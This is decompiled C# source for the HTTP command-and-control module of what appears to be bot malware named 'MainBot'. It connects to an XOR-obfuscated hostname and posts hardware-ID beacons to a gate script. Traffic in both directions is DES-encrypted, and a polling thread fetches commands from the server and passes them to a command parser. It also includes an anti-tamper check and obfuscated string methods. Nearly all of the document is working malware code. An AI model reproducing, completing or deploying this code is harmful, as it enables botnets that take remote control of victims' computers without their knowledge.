namespace MainBot
{
    using Helper;
    using System;
    using System.Reflection;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;

    internal class HTTPConnection : CommandHelper
    {
        private static bool bool_0 = false;
        private static IntPtr intptr_0 = IntPtr.Zero;
        private const short Port = 80;
        public static string string_1 = string.Empty;
        private static Thread thread_0 = new Thread(new ThreadStart(HTTPConnection.ParseStructToExecute));
        private const uint uint_1 = 1;
        private const uint uint_2 = 3;
        private const uint uint_3 = 0x200;
        private const uint uint_4 = 0x13;
        private const uint uint_5 = 0x20000000;
        private const uint uint_6 = 0x2b;
        private const uint uint_7 = 200;

        private static void DoServerRefresh()
        {
            IntPtr ptr = InternetOpen(Configuration.HWID2, 1, null, null, 0);
            if (ptr != IntPtr.Zero)
            {
                if (intptr_0 != IntPtr.Zero)
                {
                    InternetCloseHandle(intptr_0);
                }
                intptr_0 = InternetConnect(ptr, Encoding.Default.GetString(Configuration.XOREDHostname), 80, null, null, 3, 0, IntPtr.Zero);
                if (intptr_0 != IntPtr.Zero)
                {
                    byte[] buffer = SendHTTPRequest(0, CryptHelper.GenerateXOREDKey(), false);
                    if (buffer.Length > 0)
                    {
                        Struct2 struct2 = new Struct2(buffer);
                        if (struct2.uint_0 == 1)
                        {
                            FillStructAndSend();
                            return;
                        }
                    }
                }
                InternetCloseHandle(ptr);
            }
            Thread.Sleep((int) (0x3e8 * (Configuration.WaitTime / 2)));
            DoServerRefresh2();
        }

        public static void DoServerRefresh2()
        {
            if (bool_0)
            {
                bool_0 = false;
            }
            DoServerRefresh();
        }

        private static void FillStructAndSend()
        {
            Struct2 struct2 = new Struct2(SendHTTPRequest(1, new Struct3(Configuration.OS, Configuration.ushort_0, Configuration.Timeout), true));
            if (struct2.uint_0 == 1)
            {
                bool_0 = true;
                thread_0.Start();
            }
            else
            {
                DoServerRefresh2();
            }
        }

        [DllImport("wininet", CharSet=CharSet.Unicode)]
        private static extern IntPtr HttpOpenRequest(IntPtr intptr_1, string string_2, string string_3, string string_4, string string_5, string[] string_6, uint uint_8, IntPtr intptr_2);
        [DllImport("wininet", CharSet=CharSet.Unicode)]
        private static extern bool HttpQueryInfo(IntPtr intptr_1, uint uint_8, IntPtr intptr_2, ref uint uint_9, object object_0);
        [DllImport("wininet", CharSet=CharSet.Unicode)]
        private static extern bool HttpSendRequest(IntPtr intptr_1, string string_2, uint uint_8, byte[] byte_0, uint uint_9);
        [DllImport("wininet", CharSet=CharSet.Unicode)]
        private static extern bool InternetCloseHandle(IntPtr intptr_1);
        [DllImport("wininet", CharSet=CharSet.Unicode)]
        private static extern IntPtr InternetConnect(IntPtr intptr_1, string string_2, short short_1, string string_3, string string_4, uint uint_8, uint uint_9, IntPtr intptr_2);
        [DllImport("wininet", CharSet=CharSet.Unicode)]
        private static extern IntPtr InternetOpen(string string_2, uint uint_8, string string_3, string string_4, uint uint_9);
        [DllImport("wininet", CharSet=CharSet.Unicode)]
        private static extern bool InternetReadFile(IntPtr intptr_1, IntPtr intptr_2, uint uint_8, ref uint uint_9);
        private static void ParseStructToExecute()
        {
            while (bool_0)
            {
                try
                {
                    CommandHelper.ParseCommandStruct(new Struct2(SendHTTPRequest(2, null, true)));
                }
                catch
                {
                }
                Thread.Sleep((int) (0x3e8 * Configuration.WaitTime));
            }
        }

        private static byte[] SendHTTPRequest(uint Length, object ObjectToCopy, bool DoEncryptRequest)
        {
            IntPtr ptr = HttpOpenRequest(intptr_0, <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_3(), Configuration.GatePHP, null, null, null, 0x8404f700, IntPtr.Zero);
            if (ptr != IntPtr.Zero)
            {
                byte[] buffer = Util.CopyObject(new Struct1(Configuration.HWID1, Util.Ping(), Length, Util.CopyObject(ObjectToCopy)));
                if (DoEncryptRequest)
                {
                    CryptHelper.DESEncrypt(ref buffer);
                }
                string str = string_1 + Environment.NewLine;
                if (HttpSendRequest(ptr, str, (uint) str.Length, buffer, (uint) buffer.Length))
                {
                    IntPtr ptr2 = Marshal.AllocHGlobal(4);
                    uint num = 4;
                    if (Assembly.GetEntryAssembly().GetName().GetPublicKey().Length <= 0)
                    {
                        Assembly.GetCallingAssembly().GetModules()[0].Assembly.EntryPoint.Invoke(null, null);
                    }
                    if (HttpQueryInfo(ptr, 0x20000013, ptr2, ref num, null) && (Marshal.ReadInt32(ptr2) == 200L))
                    {
                        IntPtr ptr3 = Marshal.AllocHGlobal(0x80);
                        num = 0x80;
                        if (HttpQueryInfo(ptr, 0x2b, ptr3, ref num, null))
                        {
                            string str2 = Marshal.PtrToStringUni(ptr3);
                            if (str2.StartsWith(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_4()))
                            {
                                string_1 = <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_5() + str2.Substring(0, str2.IndexOf(';') + 1);
                            }
                        }
                        IntPtr ptr4 = Marshal.AllocHGlobal(0x200);
                        num = 0x200;
                        InternetReadFile(ptr, ptr4, 0x200, ref num);
                        InternetCloseHandle(ptr);
                        byte[] destination = new byte[num];
                        Marshal.Copy(ptr4, destination, 0, (int) num);
                        return destination;
                    }
                }
            }
            InternetCloseHandle(ptr);
            return new byte[0];
        }

        public enum Enum3 : uint
        {
            const_0 = 0,
            const_1 = 1,
            const_2 = 2,
            const_3 = 0,
            const_4 = 1
        }

        [StructLayout(LayoutKind.Sequential, Pack=1)]
        private struct Struct1
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst=0x26)]
            public byte[] byte_0;
            [MarshalAs(UnmanagedType.U4)]
            public uint uint_0;
            [MarshalAs(UnmanagedType.U4)]
            public uint uint_1;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst=0x40)]
            public byte[] byte_1;
            public Struct1(string string_0, uint uint_2, uint uint_3, byte[] byte_2)
            {
                this.byte_0 = new byte[0x26];
                this.byte_1 = new byte[0x40];
                this.uint_0 = uint_2;
                this.uint_1 = uint_3;
                Array.Copy(Encoding.Default.GetBytes(string_0), 0, this.byte_0, 0, string_0.Length);
                Array.Copy(byte_2, 0, this.byte_1, 0, byte_2.Length);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack=1)]
        public struct Struct2
        {
            [MarshalAs(UnmanagedType.U4)]
            public uint uint_0;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst=0x40)]
            public byte[] byte_0;
            public Struct2(byte[] byte_1)
            {
                CryptHelper.DESDecrypt(ref byte_1);
                GCHandle handle = GCHandle.Alloc(byte_1, GCHandleType.Pinned);
                IntPtr ptr = handle.AddrOfPinnedObject();
                handle.Free();
                this = (HTTPConnection.Struct2) Marshal.PtrToStructure(ptr, typeof(HTTPConnection.Struct2));
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack=1)]
        private struct Struct3
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst=20)]
            public byte[] byte_0;
            [MarshalAs(UnmanagedType.U4)]
            public int int_0;
            [MarshalAs(UnmanagedType.U4)]
            public int int_1;
            public Struct3(string string_0, int int_2, int int_3)
            {
                this.byte_0 = new byte[20];
                this.int_0 = int_2;
                this.int_1 = int_3;
                Array.Copy(Encoding.Default.GetBytes(string_0), 0, this.byte_0, 0, string_0.Length);
            }
        }
    }
}

